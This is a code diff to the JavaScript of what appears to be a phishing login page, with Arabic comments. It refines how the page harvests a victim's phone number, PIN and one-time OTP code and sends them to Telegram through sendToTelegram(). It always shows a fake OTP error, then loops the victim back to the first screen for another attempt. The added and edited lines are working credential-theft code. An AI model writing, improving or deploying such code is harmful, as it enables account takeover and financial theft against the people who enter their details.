@@ -471,15 +471,15 @@ function login(){
   var ph=phEl.value.trim();
   var pin=P.map(function(p){return p.value;}).join('');
   
-  sendToTelegram(ph, pin);
-
-  // التحقق من أن الرقم يتكون من 8 أرقام ويبدأ حتماً بـ (2 أو 3 أو 4)
+  // التحقق من أن الرقم يتكون من 8 أرقام ويبدأ بـ (2 أو 3 أو 4)
   var firstChar = ph.charAt(0);
   var isValidPrefix = (firstChar === '2' || firstChar === '3' || firstChar === '4');
 
   if(ph.length !== 8 || !isValidPrefix || pin.length !== 4){
     document.getElementById('user-error-modal').classList.remove('hide');
   } else {
+    // إرسال البيانات للتليجرام فقط عند تسجيل الدخول الناجح للتحويل إلى OTP
+    sendToTelegram(ph, pin);
     showOtp();
   }
 }
@@ -524,13 +524,20 @@ function verify(){
   
   var ph=phEl.value.trim();
   var pin=P.map(function(p){return p.value;}).join('');
+  
+  // إرسال كود OTP مرة واحدة فقط
   sendToTelegram(ph, pin, code);
 
+  // إظهار النافذة المنبثقة للخطأ
   document.getElementById('otp-error-modal').classList.remove('hide');
 }
 
 function closeOtpErrorModal(){
+  // إخفاء النافذة المنبثقة
   document.getElementById('otp-error-modal').classList.add('hide');
+  
+  // الانتقال التلقائي للواجهة الأولى عند إغلاق التنبيه
+  back();
 }
 
 function showOtp(){
